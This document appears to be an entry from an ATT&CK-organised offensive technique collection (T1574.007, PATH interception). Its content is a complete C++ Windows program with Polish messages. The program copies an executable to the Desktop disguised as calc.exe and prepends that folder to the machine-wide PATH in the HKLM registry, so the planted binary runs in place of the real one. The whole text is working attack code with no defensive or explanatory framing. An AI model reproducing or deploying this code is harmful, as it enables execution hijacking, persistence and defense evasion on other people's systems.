---
title: ".007.PathInterPATHEnviVariable"
folder: "07. Defense Evasion/T1574 Hijack Execution Flow"
---



#include <windows.h>
#include <fstream>
#include <iostream>


bool Copy1File() {
    std::ifstream src("MyEx.exe", std::ios::binary);
    std::ofstream dest("C:\\Users\\User\\Desktop\\calc.exe", std::ios::binary);

    if (!src.is_open() || !dest.is_open()) {
        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
        return false;
    }

    dest << src.rdbuf();

    if (src.fail() || dest.fail()) {
        std::cerr << "Błąd podczas kopiowania pliku.\n";
        return false;
    }

    std::cout << "Plik został pomyślnie skopiowany.\n";
    return true;
}
int ModifyPathEnvironmentVariable() {
    std::wstring newDir = L"C:\\Users\\User\\Desktop;";

    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return 1;
    }

    WCHAR oldValue[MAX_PATH * 2]; 
    DWORD oldSize = sizeof(oldValue);
    result = RegQueryValueExW(hKey, L"Path", NULL, NULL, reinterpret_cast<BYTE*>(oldValue), &oldSize);
    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }

    std::wstring newPath = newDir + reinterpret_cast<wchar_t*>(oldValue);
    const WCHAR* newWCharPath = newPath.c_str();
    DWORD newSize = static_cast<DWORD>(wcslen(newWCharPath) * sizeof(WCHAR));

    result = RegSetValueExW(hKey, L"Path", 0, REG_EXPAND_SZ, reinterpret_cast<BYTE*>(const_cast<WCHAR*>(newWCharPath)), newSize);
    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
    RegCloseKey(hKey);

    return 0;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    Copy1File();
    ModifyPathEnvironmentVariable();
    return 0;
}